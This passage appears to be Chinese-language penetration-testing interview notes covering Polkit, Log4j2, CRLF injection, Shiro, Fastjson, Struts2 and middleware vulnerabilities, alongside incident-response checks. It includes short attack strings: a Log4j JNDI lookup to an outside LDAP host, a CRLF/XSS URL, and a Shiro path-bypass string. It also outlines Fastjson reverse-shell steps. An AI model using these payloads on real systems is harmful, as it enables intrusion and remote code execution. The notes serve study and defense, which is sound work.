Polkit 是用于在类 Unix 操作系统中控制系统范围特权的组件。它为⾮特权进程提供了与特权进程进行通信的有组织的⽅式。
</p>

<p>
polkit 的 pkexec 存在本地权限提升漏洞，已获得普通权限的攻击者可通过此漏洞获取root权限。
</p>

<p>
利用：
</p>

<ol class="org-ol">
<li>通过webshell上传exp</li>
<li>执行cve-2021-4034-poc 提权</li>
<li>获得root权限</li>
</ol>
</div>
</div>
</div>
</div>
<div id="outline-container-h:1dfafbcb-ca11-4407-a8f2-a21a02e7343d" class="outline-3">
<h3 id="h:1dfafbcb-ca11-4407-a8f2-a21a02e7343d">其他问题汇总</h3>
<div class="outline-text-3" id="text-h:1dfafbcb-ca11-4407-a8f2-a21a02e7343d">
</div>
<div id="outline-container-h:9bff7b03-64d1-4200-8bba-62b4b86ee996" class="outline-4">
<h4 id="h:9bff7b03-64d1-4200-8bba-62b4b86ee996">渗透思路</h4>
<div class="outline-text-4" id="text-h:9bff7b03-64d1-4200-8bba-62b4b86ee996">
<p>
1、信息收集
</p>

<ul class="org-ul">
<li>服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）</li>
<li>网站指纹识别（包括，cms，cdn，证书等），dns记录</li>
<li>whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）</li>
<li>子域名收集，旁站，C段等</li>
<li>google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等</li>
<li>扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等</li>
<li>传输协议，通用漏洞，exp，github源码等</li>
</ul>

<p>
2、漏洞挖掘
</p>

<ul class="org-ul">
<li>浏览网站，看看网站规模，功能，特点等</li>
<li>端口，弱口令，目录等扫描,对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。</li>
<li>XSS，SQL注入，上传，命令注入，CSRF，cookie安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件 包含，重放攻击（短信轰炸），服务器漏洞检测，最后使用漏扫工具等</li>
</ul>

<p>
3、漏洞利用&amp;权限提升
</p>
<ul class="org-ul">
<li>mysql提权，serv-u提权，oracle提权</li>
<li>windows 溢出提权</li>
<li>linux脏牛,内核漏洞提权</li>
</ul>

<p>
4、清除测试数据&amp;输出报告
</p>

<p>
日志、测试数据的清理
</p>

<p>
总结，输出渗透测试报告，附修复方案
</p>

<p>
5、复测
</p>

<p>
验证并发现是否有新漏洞，输出报告，归档
</p>
</div>
</div>
<div id="outline-container-h:866429ed-538b-4ede-a4f7-cea7db93c0bc" class="outline-4">
<h4 id="h:866429ed-538b-4ede-a4f7-cea7db93c0bc">Apache Log4j2的漏洞</h4>
<div class="outline-text-4" id="text-h:866429ed-538b-4ede-a4f7-cea7db93c0bc">
<p>
原理：
</p>

<p>
Apache Log4j2是一款优秀的Java日志框架
</p>

<p>
由于Log4j2某些功能存在递归解析功能，log4j2提供的lookup功能，在处理程序日志记录时存在JNDI注入缺陷，攻击者可直接构造的恶意数据，触发远程代码执行
</p>

<p>
也就是当记录日志的一部分是用户可控时，就可以构造恶意字符串使服务器记录日志时调用JNDI访问恶意对象，JNDI是 Java 命名与目录接口
</p>

<p>
利用：
</p>

<p>
利用 LDAP 服务发起攻击 ${jndi:ldap:xxx.xxx.xxx.xxx:xxxx/exp} 
</p>

<p>
防御
</p>

<p>
更新补丁/升级版本
</p>

<p>
采用 waf 对请求流量中的 ${jndi} 进行拦截；
</p>
</div>
</div>
<div id="outline-container-h:97caf4c2-61e3-4ffa-9252-a767fed92437" class="outline-4">
<h4 id="h:97caf4c2-61e3-4ffa-9252-a767fed92437">上传点可能存在哪些漏洞</h4>
<div class="outline-text-4" id="text-h:97caf4c2-61e3-4ffa-9252-a767fed92437">
<ol class="org-ol">
<li>文件上传漏洞</li>
<li>SSRF（通过URL方式上传）</li>
</ol>
</div>
</div>
<div id="outline-container-h:1d1cdca1-fe60-4df7-b955-0d67698befbe" class="outline-4">
<h4 id="h:1d1cdca1-fe60-4df7-b955-0d67698befbe">常见的未授权访问漏洞有哪些</h4>
<div class="outline-text-4" id="text-h:1d1cdca1-fe60-4df7-b955-0d67698befbe">
<ol class="org-ol">
<li>redis 未授权</li>
<li>JBOSS 未授权</li>
<li>Docker 未授权</li>
<li>MongDB 未授权</li>
</ol>
</div>
</div>
<div id="outline-container-h:4534acc8-8847-49c7-9bd3-2e73e0030eca" class="outline-4">
<h4 id="h:4534acc8-8847-49c7-9bd3-2e73e0030eca">代码执行，命令执行 函数</h4>
<div class="outline-text-4" id="text-h:4534acc8-8847-49c7-9bd3-2e73e0030eca">
<p>
代码执行：eval，assert，call_user_func，create_function， array_map
</p>

<p>
命令执行：system，exec，shell—exec，popen
</p>
</div>
</div>
<div id="outline-container-h:548480d6-ef2d-4071-9831-9dce7188e1a5" class="outline-4">
<h4 id="h:548480d6-ef2d-4071-9831-9dce7188e1a5">nmap常见参数</h4>
<div class="outline-text-4" id="text-h:548480d6-ef2d-4071-9831-9dce7188e1a5">
<p>
半开扫描：-sS   （三次握手没有最后一步，好处是可以规避日志记录）
</p>

<p>
全开扫描：-sT   （建立三次握手）
</p>

<p>
识别操作系统：-O
</p>

<p>
禁ping扫描：-Pn
</p>

<p>
ping扫描：-sP
</p>

<p>
识别操作系统：nmap -O
</p>

<p>
常用参数：nmap -Pn 192.168.1.2 -p 1-65535 -T4
</p>
</div>
</div>
<div id="outline-container-h:c1d971b8-df47-40eb-bd8b-323c961476d2" class="outline-4">
<h4 id="h:c1d971b8-df47-40eb-bd8b-323c961476d2">etc/passwd，etc/showdow区别</h4>
<div class="outline-text-4" id="text-h:c1d971b8-df47-40eb-bd8b-323c961476d2">
<p>
/etc/passwd(所有用户都可读）：用户名，密码，UID，GID，描述信息，主目录，默认Shell路径
</p>

<p>
etc/passwd/showdow（root权限可读）：用户名，密码 
</p>
</div>
</div>
<div id="outline-container-h:6a11019b-ed69-48d2-8542-aaf02c4c6618" class="outline-4">
<h4 id="h:6a11019b-ed69-48d2-8542-aaf02c4c6618">os&#x2013;shell 和 os&#x2013;cmd 区别</h4>
<div class="outline-text-4" id="text-h:6a11019b-ed69-48d2-8542-aaf02c4c6618">
<p>
–os-cmd=id *执行系统命令
</p>

<p>
–os-shell *系统交互shell
</p>
</div>
</div>
<div id="outline-container-h:28092d1b-e8bf-4609-b58e-268b8b836d4e" class="outline-4">
<h4 id="h:28092d1b-e8bf-4609-b58e-268b8b836d4e">CRLF 注入漏洞（http拆分）</h4>
<div class="outline-text-4" id="text-h:28092d1b-e8bf-4609-b58e-268b8b836d4e">
<ul class="org-ul">
<li><p>
原理：
</p>

<p>
是因为Web应用没有对用户输入做严格验证，导致攻击者可以输入一些恶意字符。攻击者一旦向请求行或首部中的字段注入恶意的CRLF，就能注入一些首部字段或报文主体，并在响应中输出，所以又称为HTTP响应拆分漏洞
</p>

<p>
CRLF指【回车符】+【换行符】   CR：回车 \r,%0d     LF：换行 \n,%0a
</p>

<p>
在HTTP规范中，行应该使用CRLF来结束，【首部】和【主体】由两个CRLF分隔
</p></li>

<li><p>
危害
</p>

<p>
伪造HTTP响应头
</p>

<p>
系统文件中存在CRLF漏洞则会导致任意命令执行
</p>

<p>
结合其他漏洞会产生更加严重的危害
</p></li>

<li>利用

<ul class="org-ul">
<li>通过修改HTTP参数或URL，注入恶意的CRLF，查看构造的恶意数据是否在响应头中输出。</li>

<li><p>
结合xss
</p>

<p>
<a href="http://ip/8080/url=%0d%0a%0d%0a">http://ip/8080/url=%0d%0a%0d%0a</a>&lt;img src=1 onerror=alert(<i>xss</i>)&gt;/
</p></li>
</ul></li>

<li>测试方法

<ol class="org-ol">
<li>抓包，在请求行的url参数中加入特殊构造的CRLF字符， xxx.com%0d%0aSet-Cookie:crlf=true</li>
<li>查看恶意数据是否在响应头中输出</li>
<li>如果响应首部中多了个Set-Cookie字段。这就证实了该系统存在CRLF注入漏洞</li>
</ol></li>

<li><p>
修复
</p>

<p>
过滤 \r 、\n 之类的行结束符，避免输入的数据污染其他 HTTP 首部字段。
</p></li>
</ul>
</div>
</div>
</div>
<div id="outline-container-h:35730b0c-863b-4b39-9392-c4c1ccdb7ffb" class="outline-3">
<h3 id="h:35730b0c-863b-4b39-9392-c4c1ccdb7ffb">应急响应</h3>
<div class="outline-text-3" id="text-h:35730b0c-863b-4b39-9392-c4c1ccdb7ffb">
<ul class="org-ul">
<li>流程

<ol class="org-ol">
<li><p>
收集信息：收集客户信息和中毒主机信息，包括样本
</p>

<p>
信息收集主要是做：流量、日志、可疑进程的内存、失陷系统镜像、恶意样本、客户资产收集、资产相关漏洞测试报告、防御设备的日志
</p></li>

<li>判断类型：判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DoS等等
事件类型分为7类：大规模沦陷、挖矿病毒、勒索病毒、无文件落地、不死（顽固）马、钓鱼应急响应、数据劫持</li>

<li>深入分析：日志分析、进程分析、启动项分析、样本分析</li>

<li>清理处置：直接杀掉进程，删除文件，打补丁，抑或是修复文件。</li>

<li>产出报告：整理并输出完整的安全事件报告。</li>
</ol></li>
</ul>



<ul class="org-ul">
<li>D盾查找webshell—看日志</li>

<li><p>
win排查：
</p>

<p>
查看开机启动项
</p>

<p>
进程查看：netstat -ano
</p></li>
</ul>
</div>
<div id="outline-container-h:5921524a-563e-4f52-9f7e-5fe732eda2bb" class="outline-4">
<h4 id="h:5921524a-563e-4f52-9f7e-5fe732eda2bb">挖矿漏洞如何排查</h4>
<div class="outline-text-4" id="text-h:5921524a-563e-4f52-9f7e-5fe732eda2bb">
<ul class="org-ul">
<li>问题现象:

<ul class="org-ul">
<li>CPU的使用率一直100%</li>
<li>服务器卡顿，无法正常使用</li>
</ul></li>

<li>疑似原因:

<ul class="org-ul">
<li>系统密码较弱被破解</li>
<li>安装的程序有漏洞被不法分子利用</li>
<li>等等</li>
</ul></li>

<li><p>
排查步骤
</p>

<ol class="org-ol">
<li>使用top命令观察占用cpu程序的PID</li>
<li>通过PID查看该程序所在的目录：ls <i>proc/XXX</i></li>
<li>执行 ll /proc/14202 查看该程序运行的目录</li>
<li>进入该目录并进行查看都有哪些文件</li>
<li>将这些文件的权限全部修改成000，使这些程序无法继续执行：chmod 000 -R *</li>
<li>以上基本可以找出恶意程序所在的目录了，接着我们将该程序 kill 掉即可:kill -9 PID</li>
</ol>

<div class="org-src-container">
<pre class="src src-sh">&#23450;&#26102;&#20219;&#21153;&#25490;&#26597;
1. &#26597;&#30475;&#23450;&#26102;&#20219;&#21153;&#26159;&#21542;&#23384;&#22312;&#25991;&#20214;&#65306;crontab -l
2. &#28165;&#31354;&#23450;&#26102;&#20219;&#21153;&#24182;&#19988;&#20998;&#26512;&#26408;&#39532;&#33050;&#26412;&#65306;crontab -r

&#26381;&#21153;&#22120;&#20570;&#23433;&#20840;&#21152;&#22266;&#65306;&#27604;&#22914;&#26356;&#25913;&#40664;&#35748;&#36828;&#31243;&#31471;&#21475;&#12289;&#37197;&#32622;&#38450;&#28779;&#22681;&#35268;&#21017;&#12289;&#35774;&#32622;&#22797;&#26434;&#24230;&#36739;&#39640;&#30340;&#23494;&#30721;&#31561;&#26041;&#27861;
</pre>
</div></li>
</ul>
</div>
<div id="outline-container-h:dd19291e-4180-4582-81e7-c9fe19d29309" class="outline-5">
<h5 id="h:dd19291e-4180-4582-81e7-c9fe19d29309">内存码如何排查</h5>
<div class="outline-text-5" id="text-h:dd19291e-4180-4582-81e7-c9fe19d29309">
<p>
如果是jsp注入，日志中排查可疑jsp的访问请求。
</p>

<p>
如果是代码执行漏洞，排查中间件的error.log，查看是否有可疑的报错，判断注入时间和方法
</p>

<p>
根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。
</p>

<p>
如果是servlet或者spring的controller类型，根据上报的webshell的url查找日志（日志可能被关闭，不一定有），根据url最早访问时间确定被注入时间。
</p>

<p>
如果是filter或者listener类型，可能会有较多的404但是带有参数的请求，或者大量请求不同url但带有相同的参数，或者页面并不存在但返回200
</p>
</div>
</div>
<div id="outline-container-h:a721e3c0-dcb7-49c6-b618-05d96d7e00a4" class="outline-5">
<h5 id="h:a721e3c0-dcb7-49c6-b618-05d96d7e00a4">内网渗透流程</h5>
<div class="outline-text-5" id="text-h:a721e3c0-dcb7-49c6-b618-05d96d7e00a4">
<p>
信息收集：识别内网存活的主机 IP， 运行端口扫描和漏洞扫描获取可以利用的漏洞
</p>

<p>
漏洞验证/漏洞攻击：
</p>

<p>
后渗透
</p>

<p>
日志清理
</p>
</div>
</div>
</div>
</div>
<div id="outline-container-h:38313d20-a4e3-4d43-a62e-4e9e6ef73fb4" class="outline-3">
<h3 id="h:38313d20-a4e3-4d43-a62e-4e9e6ef73fb4">框架漏洞</h3>
<div class="outline-text-3" id="text-h:38313d20-a4e3-4d43-a62e-4e9e6ef73fb4">
</div>
<div id="outline-container-h:9a6ee79f-9092-43cf-b5e3-ff75166f9970" class="outline-4">
<h4 id="h:9a6ee79f-9092-43cf-b5e3-ff75166f9970">Struts2 RCE 漏洞</h4>
<div class="outline-text-4" id="text-h:9a6ee79f-9092-43cf-b5e3-ff75166f9970">
<p>
struts2是第二代基于MVC模型**Java企业级web应用框架**，成为国内外较为流行的容器软件中间件,用于Java Web应用程序。
</p>

<p>
原理
</p>
<ul class="org-ul">
<li>把用户的输入带入到 OGNL表达式 %{value}  解析并执行</li>
</ul>

<p>
利用方式
</p>
<ul class="org-ul">
<li>%{payload}</li>
</ul>

<p>
如何判断
</p>
<ul class="org-ul">
<li>通过页面回显的错误消息来判断，页面不回显错误消息时则无效。</li>
<li>通过网页后缀来判断，默认.cation，有些人会改成.do 有可能不准。</li>
<li>判断 /struts/webconsole.html 是否存在来进行判断，需要 devMode 为 true。</li>
<li><p>
其它的方法：通过 actionErrors。要求是对应的 Action 需要继承自 ActionSupport 类。
</p>

<p>
利用方法：如原始 URL 为 <a href="https://threathunter.org/%E5%88%99%E6%A3%80%E6%B5%8B%E6%89%80%E7%94%A8%E7%9A%84">https://threathunter.org/%E5%88%99%E6%A3%80%E6%B5%8B%E6%89%80%E7%94%A8%E7%9A%84</a> URL 为 <a href="https://threathunter.org/?actionErrors=1111">https://threathunter.org/?actionErrors=1111</a>
</p>

<p>
如果返回的页面出现异常，则可以认定为目标是基于 Struts2 构建的。异常包括但不限于以下几种现象：
</p>
<ul class="org-ul">
<li>页面直接出现 404 或者 500 等错误。</li>
<li>页面上输出了与业务有关错误消息，或者 1111 被回显到了页面上。</li>
<li>页面的内容结构发生了明显的改变。</li>
<li>页面发生了重定向。</li>
</ul></li>
</ul>

<p>
修复建议
</p>
<ul class="org-ul">
<li>升级 Struts2 版本</li>
</ul>

<p>
struts2 docker-vulhub 使用方法
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #483d8b;">cd</span> /Users/x/vulhub/struts2/&#36873;&#25321;&#30456;&#24212;&#28431;&#27934;
docker-compose build  //&#32534;&#35793;&#38774;&#22330;&#29615;&#22659;
docker-compose up -d  //&#21551;&#21160;&#25972;&#20010;&#29615;&#22659;
http://youip:8080/index.action  //&#35775;&#38382;&#28431;&#27934;&#39029;&#38754;
docker-compose down //&#27979;&#35797;&#23436;&#27605;&#20043;&#21518;,&#21363;&#21487;&#32467;&#26463;&#26381;&#21153;&#65292;&#20351;&#29615;&#22659;&#21464;&#20026;&#21021;&#22987;&#29366;&#24577;&#12290;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:ff3dfc37-f7bf-4227-965a-8c328a993a52" class="outline-4">
<h4 id="h:ff3dfc37-f7bf-4227-965a-8c328a993a52">Shiro 框架漏洞</h4>
<div class="outline-text-4" id="text-h:ff3dfc37-f7bf-4227-965a-8c328a993a52">
<p>
Apache Shiro是企业常见的JAVA安全框架，执行身份验证、授权、密码和会话管理。只要rememberMe的AES加密密钥泄露，无论shiro是什么版本都会导致 <b>反序列化漏洞</b>
</p>

<p>
shiro-550、Shiro-721的区别：
</p>

<ol class="org-ol">
<li>加密方式不同 （cbc模式每次加密的结果都会影响到下一次）</li>
<li>721需要登录获取有效的cookie，550不需要</li>
</ol>

<p>
shiro721出网协议：
</p>
<ul class="org-ul">
<li>jndi，ldap，rmi</li>
</ul>
</div>
<div id="outline-container-h:664ae52a-932b-4cbc-b68a-3b8ef731d87f" class="outline-5">
<h5 id="h:664ae52a-932b-4cbc-b68a-3b8ef731d87f">Apache Shiro反序列化漏洞（Shiro-550  CVE-2016-4437)（Shiro &lt; 1.2.5）</h5>
<div class="outline-text-5" id="text-h:664ae52a-932b-4cbc-b68a-3b8ef731d87f">
<ul class="org-ul">
<li><p>
原理
</p>

<p>
Shiro550：使用已知密钥（不需要登录）
</p>

<p>
在Shiro框架下，用户登陆成功后会生成一个经过加密的Cookie。其Cookie的Key的值为RememberMe，Value的值是经过序列化、AES加密和Base64编码后得到的结果。AES的加密密钥为硬编码，导致攻击者可以构造恶意数据造成反序列化RCE漏洞
</p></li>

<li><p>
在服务端接收cookie值时，按以下步骤解析：
</p>

<p>
检索RemeberMe cookie的值 &gt; Base 64解码&gt; 使用ACE解密（加密密钥硬编码）&gt; 进行反序列化操作（未作过滤处理）
</p></li>

<li><p>
漏洞特征
</p>

<p>
在请求包的Cookie中为 remeberMe字段赋任意值
</p>

<p>
在返回包的 Set-Cookie 中存在 rememberMe=deleteMe 字段
</p></li>

<li><p>
防御
</p>

<p>
shiro升级到1.2.5版本及以上版本
</p>

<p>
但是可能升级了shiro版本仍然存在反序列化漏洞，其原因是因为我们使用了别人的开源框架，他们在代码里会配置shiro的密钥，如果使用了开源的框架，而没有修改shiro的密钥，其实这就相当于你使用的shiro密钥已经泄露，如果使用大量的密钥集合进行轮流尝试，是非常危险的
</p></li>
</ul>
</div>
</div>
<div id="outline-container-h:ca95d0aa-c6b7-436f-9045-67761515572a" class="outline-5">
<h5 id="h:ca95d0aa-c6b7-436f-9045-67761515572a">shiro-721</h5>
<div class="outline-text-5" id="text-h:ca95d0aa-c6b7-436f-9045-67761515572a">
<p>
通过 AES-128-CBC 模式加密,易受到Padding Oracle攻击
</p>

<p>
通过改变密文值来达到改变经服务器端AES解密后的数据（128是指密钥长度,CBC是指 “密码分组链接” 加密模式）
</p>

<p>
利用工具生成恶意的rememberMe cookie，使用这个cookie替换原数据包中的cookie。然后登陆进服务器看，会发现/tmp目录下被创建了一个123文件 （ysoserial.jar（java反序列化利用工具））
</p>

<p>
使用登录后rememberMe={value}去爆破正确的key值进而反序列化（需要登录）
</p>

<ul class="org-ul">
<li><p>
测试流程
</p>

<p>
访问登录页面，登录
</p>

<p>
请求account页面，只需要抓包时能获取到rememberMe=xxx都可
</p>

<p>
利用exp爆破payload的加密密文
</p>

<p>
获取密文后对之前请求的页面以rememberMe=xxx的格式重放
</p>

<p>
获取到命令执行结果
</p>

<p>
因为时间太长，不适用于实际环境的测试
</p></li>
</ul>
</div>
</div>
<div id="outline-container-h:9348711e-344e-4582-9b5f-4d16197069b8" class="outline-5">
<h5 id="h:9348711e-344e-4582-9b5f-4d16197069b8">权限绕过漏洞（CVE-2020-1957）</h5>
<div class="outline-text-5" id="text-h:9348711e-344e-4582-9b5f-4d16197069b8">
<ul class="org-ul">
<li>Shiro中常见的拦截器

<ol class="org-ol">
<li>anon 为匿名拦截器，不需要登录就能访问，一般用于静态资源,或者移动端接口</li>

<li>authc 为登录拦截器，需要登录认证才能访问的资源。</li>
</ol></li>

<li><p>
原理
</p>

<p>
主要是因为 shiro 拦截器先于spring boot执行，并且 shiro和spring处理url的不一致导致的，而spring在请求处理过程中会去除/./和/;xxxasxdasd/中的内容，通过这种方式变形的url可能和shiro配置的filter不一致，导致了权限绕过。
</p>

<div class="org-src-container">
<pre class="src src-sh">/xxx/..;/admin/  &#21487;&#20197;&#32469;&#36807;Shiro&#20013;&#23545;&#30446;&#24405;&#30340;&#26435;&#38480;&#38480;&#21046;
</pre>
</div></li>

<li><p>
防御
</p>

<p>
尽量避免使用*通配符作为动态路由拦截器的URL路径表达式
</p>

<p>
升级shiro至1.5.2版本以上
</p></li>
</ul>
</div>
</div>
</div>
<div id="outline-container-h:d25380d9-4643-467a-b0f9-6faa582cc558" class="outline-4">
<h4 id="h:d25380d9-4643-467a-b0f9-6faa582cc558">Fastjson 反序列化漏洞（是一个 Java 库）</h4>
<div class="outline-text-4" id="text-h:d25380d9-4643-467a-b0f9-6faa582cc558">
<p>
可以将 Java 对象转换为 JSON 格式，也可以将 JSON 字符串转换为 Java 对象
</p>

<ul class="org-ul">
<li><p>
原理
</p>

<p>
在处理json对象的时候，未对 @type 字段进行完全的安全性验证，攻击者可以传入危险类，并调用危险类连接远程rmi主机，通过其中的恶意类执行代码。
</p>

<p>
攻击者可以传入一个恶意构造的JSON内容，程序对其进行反序列化后得到恶意类并执行了恶意类中的恶意函数，进而导致代码执行
</p></li>

<li><p>
fastjson指纹信息
</p>

<p>
有报错回显： 不闭合花括号判断：在报错中往往存在 fastjson 的字段
</p>

<p>
无报错回显： Dnslog判断：{"@type":"java.net.Inet4Address","val":"dnslog"}
</p></li>

<li>利用

<ol class="org-ol">
<li>新建 Exploit.java，反弹shell命令在代码内</li>
<li>编译成 Exploit.class</li>
<li>开启三个监听</li>
<li>第一个 使用python3开启一个临时服务，然后把编译好的Exploit.class文件放至web目录下，使浏览器访问会下载</li>
<li>第二个 服务器使用工具marshalsec开启LDAP服务监听：</li>
<li>第三个 开启nc监听设定的端口</li>
<li>访问fastjson页面使用Burp抓包，构造数据包修改为POST请求，使用EXP</li>
<li>发送后可以看到nc监听窗口成功得到shell</li>
</ol></li>
</ul>
</div>
</div>
<div id="outline-container-h:6543dd60-2e2b-489c-a496-b19940373dae" class="outline-4">
<h4 id="h:6543dd60-2e2b-489c-a496-b19940373dae">thinkphp (RCE漏洞)</h4>
<div class="outline-text-4" id="text-h:6543dd60-2e2b-489c-a496-b19940373dae">

<figure id="org28aca16">
<img src="https://image.3001.net/images/20200908/1599567391.png" alt="1599567391.png">

</figure>


<p>
ThinkPHP 2.x 任意代码执行漏洞
</p>

<p>
原理：ThinkPHP 2.x版本中，使用preg_replace的/e匹配路由，导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。
</p>

<p>
Thinkphp5-5.0.22/5.1.29远程执行代码漏洞 (控制器名未过滤导致rce)
</p>

<p>
原理：框架错误地处理了控制器名称，如果网站未启用强制路由（默认设置），则会导致RCE漏洞。
</p>

<p>
Thinkphp5 5.0.23远程执行代码漏洞 (核心类Request远程代码执行漏洞)
</p>

<p>
原理：框架在获取method的方法中没有正确处理方法名，使攻击者可以调用Request类的任何方法，攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞
</p>

<p>
Thinkphp5 SQL注入漏洞和敏感信息泄露漏洞
</p>

<p>
原理：传入的某参数在绑定编译指令时没有安全处理，预编译的时候导致SQL异常报错。然而thinkphp5默认开启debug模式，在漏洞环境下构造错误的SQL语法会泄露数据库的账号和密码
</p>
</div>
</div>
<div id="outline-container-h:5726ca2f-3def-4b1a-9188-627df03b2ea2" class="outline-4">
<h4 id="h:5726ca2f-3def-4b1a-9188-627df03b2ea2">spring （RCE）</h4>
<div class="outline-text-4" id="text-h:5726ca2f-3def-4b1a-9188-627df03b2ea2">
<p>
最新漏洞 （CVE-2022-22965）
</p>

<p>
通过 <b>数据绑定</b> 的方式引发远程代码执行 (RCE) 攻击漏洞，触发的前提条件如下：
</p>

<ul class="org-ul">
<li>JDK 9+</li>
<li>Apache Tomcat（war 包部署形式）</li>
<li>Spring MVC/ Spring WebFlux 应用程序</li>
</ul>

<p>
利用方式
</p>

<ul class="org-ul">
<li>通过修改tomcat日志保存的文件名、后缀、路径等信息，写入一句话木马</li>
</ul>

<p>
spring特征：
</p>

<ol class="org-ol">
<li>icon图标是一个 小绿叶子</li>
<li>看报错页面</li>
<li>wappalyzer插件识别</li>
<li>f12看X-Application-Context头</li>
</ol>
</div>
<div id="outline-container-h:b2218517-a3ba-41cb-b8c7-5015e93f88cc" class="outline-5">
<h5 id="h:b2218517-a3ba-41cb-b8c7-5015e93f88cc">Spring Security OAuth2 远程命令执行（CVE-2016-4977）</h5>
<div class="outline-text-5" id="text-h:b2218517-a3ba-41cb-b8c7-5015e93f88cc">
<p>
构造恶意 SpEL 表达式 触发远程代码执行漏洞。
</p>

<p>
需要知道账号密码的前提下才可以利用该漏洞
</p>

<p>
老漏洞：大部分是存在 SpEL 表达式注入
</p>
</div>
</div>
</div>
</div>
<div id="outline-container-h:8fca0df8-d607-442b-a187-b096debe9a94" class="outline-3">
<h3 id="h:8fca0df8-d607-442b-a187-b096debe9a94">中间件漏洞</h3>
<div class="outline-text-3" id="text-h:8fca0df8-d607-442b-a187-b096debe9a94">
<p>
如何识别中间件
</p>

<ul class="org-ul">
<li>URL报错信息</li>
<li>查看返回包web Server字段</li>
<li>插件：W3Techs</li>
<li>端口判断：</li>
</ul>

<p>
中间件包括
</p>

<ul class="org-ul">
<li>IIS：解析漏洞，PUT漏洞，短文件名猜解，远程代码执行</li>
<li>Apache：解析漏洞，目录遍历</li>
<li>Nginx：解析漏洞，</li>
<li>Tomcat：PUT方法任意文件上传，远程代码执行，war后门文件部署</li>
<li>JBoss：反序列化漏洞，war后门文件部署</li>
<li>WebLogic：反序列化漏洞，SSRF，任意文件上传，war后门文件部署</li>
</ul>

<p>
其他中间件相关漏洞
</p>

<ul class="org-ul">
<li>fastCGI 未授权访问，任意命令执行</li>
<li>PHPCGI 远程代码执行</li>
</ul>
</div>
<div id="outline-container-h:c7823978-36d5-4c92-b6f0-03fd28df8936" class="outline-4">
<h4 id="h:c7823978-36d5-4c92-b6f0-03fd28df8936">Tomcat漏洞 (8080/8089)</h4>
<div class="outline-text-4" id="text-h:c7823978-36d5-4c92-b6f0-03fd28df8936">
<p>
漏洞类型
</p>

<p>
1、Tomcat后台弱口令上传war包
</p>

<p>
2、Tomcat的PUT的上传漏洞(CVE-2017-12615)
</p>

<p>
3、Tomcat反序列化漏洞(CVE-2016-8735)
</p>

<p>
4、Tomcat之JMX服务弱口令漏洞
</p>

<p>
5、Tomcat 样例目录session操控漏洞
</p>

<p>
6、Tomcat本地提权漏洞(CVE-2016-1240)
</p>

<p>
7、Tomcat win版默认空口令漏洞(CVE-2009-3548)
</p>
</div>
<div id="outline-container-h:46770303-17a9-45a7-9839-b7732de53c32" class="outline-5">
<h5 id="h:46770303-17a9-45a7-9839-b7732de53c32">Tomcat的PUT方法任意文件上传漏洞(CVE-2017-12615)</h5>
<div class="outline-text-5" id="text-h:46770303-17a9-45a7-9839-b7732de53c32">
<p>
原理
</p>

<p>
由于ApacheTomcat服务组件中开启了http的Put方法所造成的攻击者可以利用该方法任意上传jsp木马所造成的远程代码执行漏洞。该漏洞所影响的版本从ApacheTomcat7.0.0-7.0.79
</p>

<p>
上传方法：
</p>

<ol class="org-ol">
<li>/在文件名中是非法的，会被去除(Windows/Linux)</li>
<li>文件后缀加上::$DATA (Windows)</li>
<li>空格 windows下不允许文件以空格结尾，上传到windows会自动去掉末尾空格（Windows）</li>
</ol>

<p>
修复建议：
</p>

<ul class="org-ul">
<li>readonly 改为 true</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-h:9f0e11a5-6554-48c3-880f-fd2027a5e659" class="outline-4">
<h4 id="h:9f0e11a5-6554-48c3-880f-fd2027a5e659">JBOSS漏洞 (8080/8089)</h4>
<div class="outline-text-4" id="text-h:9f0e11a5-6554-48c3-880f-fd2027a5e659">
<ol class="org-ol">
<li>反序列化漏洞</li>
<li>控制台未授权访问</li>
<li>弱口令</li>
</ol>
</div>
<div id="outline-container-h:6839721f-cca9-4986-a025-8636b9f35c76" class="outline-5">
<h5 id="h:6839721f-cca9-4986-a025-8636b9f35c76">5.x/6.x 反序列化漏洞（CVE-2017-12149）</h5>
<div class="outline-text-5" id="text-h:6839721f-cca9-4986-a025-8636b9f35c76">
<p>
原理
</p>

<p>
该漏洞位于JBoss的HttpInvoker组件中的ReadOnlyAccessFilter过滤器中，其
doFilter方法在没有进行任何安全检查和限制的情况下尝试将来自客户端的序列
化数据流进行反序列化，导致攻击者可以通过精心设计的序列化数据来执行任意
代码。攻击者利用该漏洞无需用户验证在系统上执行任意命令，获得服务器的控
制权。
</p>
</div>
</div>
</div>
<div id="outline-container-h:67adaa77-27db-41be-9059-c63e1b2b4a5b" class="outline-4">
<h4 id="h:67adaa77-27db-41be-9059-c63e1b2b4a5b">weblogic漏洞 (7001/7002-java反序列化/控制台弱口令)</h4>
<div class="outline-text-4" id="text-h:67adaa77-27db-41be-9059-c63e1b2b4a5b">
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#25511;&#21046;&#21488;&#36335;&#24452;&#27844;&#38706;</span>
Weakpassword  

<span style="color: #b22222;">#</span><span style="color: #b22222;">SSRF&#65306;</span>
CVE-2014-4210   

<span style="color: #b22222;">#</span><span style="color: #b22222;">JAVA&#21453;&#24207;&#21015;&#21270;&#65306;Weblogic &#40664;&#35748;&#24320;&#21551; T3 &#21327;&#35758;&#65292;&#25915;&#20987;&#32773;&#21487;&#21033;&#29992;T3&#21327;&#35758;&#36827;&#34892;&#21453;&#24207;&#21015;&#21270;&#28431;&#27934;&#23454;&#29616;&#36828;&#31243;&#20195;&#30721;&#25191;&#34892;</span>
CVE-2015-4852  
CVE-2016-0638  
CVE-2016-3510   
CVE-2017-3248   
CVE-2018-2628 
CVE-2018-2893   

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#20219;&#24847;&#25991;&#20214;&#19978;&#20256;</span>
CVE-2018-2894   

